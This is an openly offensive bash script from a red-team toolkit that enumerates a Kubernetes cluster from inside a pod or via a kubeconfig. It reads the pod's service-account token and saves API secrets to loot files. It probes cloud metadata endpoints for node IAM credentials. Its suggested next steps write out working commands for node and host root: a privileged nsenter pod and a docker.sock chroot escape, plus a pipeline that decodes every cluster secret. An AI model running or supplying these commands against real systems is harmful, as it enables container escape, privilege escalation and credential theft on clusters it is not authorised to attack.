#!/usr/bin/env bash
# EnumGod - Red Team Enumeration Toolkit   |   Author: Jeet Ramoliya
# ============================================================================
# kube-enum.sh  -  Kubernetes enumeration from a pod or a kubeconfig context.
#                  RBAC (can-i matrix), secrets, node-escape surface, cluster pivot.
#
# ENGINE   kubectl if present; otherwise raw curl to the API with the pod SA token.
#          Everything degrades gracefully.
#
# USAGE
#   ./kube-enum.sh                 # in-pod: uses the mounted service-account token
#   ./kube-enum.sh -j              # also write findings.json
#   KUBECONFIG=~/.kube/config ./kube-enum.sh
# ============================================================================
set -u
umask 077  # loot dirs/files not world-readable
OUTBASE="."; JSON=0
while [ $# -gt 0 ]; do case "$1" in
  -o) OUTBASE="$2"; shift 2;;
  -j|--json) JSON=1; shift;;
  -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
  *) echo "unknown arg: $1"; exit 1;;
esac; done

HOST=$(hostname 2>/dev/null || echo host); TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/kubeenum_${HOST}_${TS}"; mkdir -p "$RUN" || { echo "cannot create $RUN"; exit 1; }
chmod 700 "$RUN" 2>/dev/null
if [ -t 1 ]; then R=$'\e[31m';Y=$'\e[33m';C=$'\e[36m';G=$'\e[32m';D=$'\e[90m';N=$'\e[0m'; else R=;Y=;C=;G=;D=;N=; fi
SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"; : > "$SUMMARY"; : > "$NEXT"
HIGHN=0;MEDN=0;INFON=0; declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()
sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
flag(){ sev="$1";shift;txt="$*";case "$sev" in HIGH)col=$R;tag="[HIGH]";HIGHN=$((HIGHN+1));J_HIGH+=("$txt");; MED)col=$Y;tag="[MED ]";MEDN=$((MEDN+1));J_MED+=("$txt");; *)col=$D;tag="[INFO]";INFON=$((INFON+1));J_INFO+=("$txt");;esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"; printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"; }
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }
has(){ command -v "$1" >/dev/null 2>&1; }
enumgod_banner(){ printf '%s' "${C:-}"; cat <<'ART'
 _____                        ____           _
| ____|_ __  _   _ _ __ ___  / ___| ___   __| |
|  _| | '_ \| | | | '_ ` _ \| |  _ / _ \ / _` |
| |___| | | | |_| | | | | | | |_| | (_) | (_| |
|_____|_| |_|\__,_|_| |_| |_|\____|\___/ \__,_|
ART
  printf '%s   EnumGod  Red Team Enumeration Toolkit%s\n' "${G:-}" "${N:-}"
  printf '%s   author : Jeet Ramoliya   module : Kubernetes%s\n\n' "${D:-}" "${N:-}"; }
enumgod_banner
echo "${G}[*] kube-enum  ->  $RUN${N}"

SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=""; NS="default"; API=""
if [ -r "$SA/token" ]; then
  TOKEN=$(cat "$SA/token" 2>/dev/null); NS=$(cat "$SA/namespace" 2>/dev/null || echo default)
  API="https://${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}:${KUBERNETES_SERVICE_PORT:-443}"
  flag HIGH "In-pod service-account token present ($SA/token), namespace=$NS."
fi
CACERT="$SA/ca.crt"; CURLTLS="-s --max-time 8"; [ -f "$CACERT" ] && CURLTLS="$CURLTLS --cacert $CACERT" || CURLTLS="$CURLTLS -k"
kapi(){ curl $CURLTLS -H "Authorization: Bearer $TOKEN" "$API$1" 2>/dev/null; }

# environment facts
{
  echo "in-pod: $([ -r "$SA/token" ] && echo yes || echo no)"
  echo "API: ${API:-?}  namespace: $NS"
  echo "KUBECONFIG: ${KUBECONFIG:-$([ -f "$HOME/.kube/config" ] && echo "$HOME/.kube/config" || echo none)}"
  grep -qa 'kubepods\|docker\|containerd' /proc/1/cgroup 2>/dev/null && echo "containerized: yes"
} | save 00_context.txt

# ---------------- RBAC: what can I do ----------------
sect "RBAC (what this identity can do)"
if has kubectl; then
  kubectl auth can-i --list 2>/dev/null | save 01_can_i.txt
  kubectl auth can-i create pods            >/dev/null 2>&1 && { flag HIGH "Can CREATE pods -> schedule a hostPath/privileged pod -> node root."; nextstep "Pod -> node root" "kubectl run x --image=alpine --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"x\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true},\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"sh\"],\"stdin\":true,\"tty\":true}]}}' -it"; }
  kubectl auth can-i get secrets            >/dev/null 2>&1 && { flag HIGH "Can READ secrets -> harvest cluster credentials."; nextstep "Dump secrets" "kubectl get secrets -A -o json | jq -r '.items[]|.data|to_entries[]|.value' | base64 -d"; }
  kubectl auth can-i create clusterrolebindings >/dev/null 2>&1 && flag HIGH "Can create clusterrolebindings -> bind yourself to cluster-admin."
  kubectl auth can-i '*' '*'                >/dev/null 2>&1 && flag HIGH "Can do * on * -> effectively cluster-admin."
  kubectl auth can-i create pods/exec       >/dev/null 2>&1 && flag MED "Can exec into pods -> pivot into other workloads."
  kubectl get nodes 2>/dev/null | save 02_nodes.txt
  kubectl get pods -A 2>/dev/null | save 03_pods.txt
  kubectl get namespaces 2>/dev/null | save 04_namespaces.txt
elif [ -n "$TOKEN" ]; then
  flag INFO "kubectl absent - querying the API directly with the pod token."
  kapi "/api/v1/namespaces/$NS/secrets" | save 01_secrets_raw.json
  grep -q '"kind": *"SecretList"' "$RUN/01_secrets_raw.json" 2>/dev/null && { flag HIGH "Can READ secrets in $NS via API (see 01_secrets_raw.json)."; nextstep "Decode secret" "jq -r '.items[].data|to_entries[]|.value' 01_secrets_raw.json | base64 -d"; }
  kapi "/api/v1/pods" | save 03_pods_raw.json
  kapi "/api/v1/nodes" | save 02_nodes_raw.json
  grep -q '"kind": *"NodeList"' "$RUN/02_nodes_raw.json" 2>/dev/null && flag MED "Can list nodes via API."
else
  flag INFO "No kubectl and no in-pod token / kubeconfig - nothing to query."
  nextstep "From a kubeconfig" "KUBECONFIG=./config kubectl auth can-i --list"
fi

# ---------------- escape / high-risk surface ----------------
sect "Node-escape & pivot surface"
# host mounts / privileged already handled via can-i create pods
[ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ] && { flag HIGH "Writable docker.sock in this pod -> host root."; nextstep "docker.sock" "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"; }
[ -e /host ] && flag HIGH "/host path present in pod (hostPath mount) -> chroot /host."
grep -qa 'cap_sys_admin' /proc/self/status 2>/dev/null
if command -v capsh >/dev/null 2>&1; then capsh --print 2>/dev/null | grep -q 'cap_sys_admin' && flag HIGH "Pod holds CAP_SYS_ADMIN -> likely escapable to host."; fi
# cloud metadata reachable from pod -> node IAM creds
curl -s --max-time 3 -H 'Metadata:true' "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | grep -qi vmId && { flag HIGH "Azure IMDS reachable from pod -> node managed identity (run rt-cloudenum.sh)."; }
curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | grep -q . && flag HIGH "AWS IMDS role reachable from pod -> node IAM role."

# ---------------- summary ----------------
sect "Writing ranked summary"
{
  echo "kube-enum summary - $HOST - $(date)"; echo "namespace=$NS api=${API:-?}"; echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###"; printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="; if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> Get a token/kubeconfig, then re-run."; fi
} > "$SUMMARY"
if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  { printf '{\n  "host":"%s","namespace":"%s","ts":"%s",\n' "$HOST" "$NS" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n  "med":'; jarr x "${J_MED[@]:-}"; printf ',\n  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n}\n'; } > "$JFILE"
fi
echo; echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
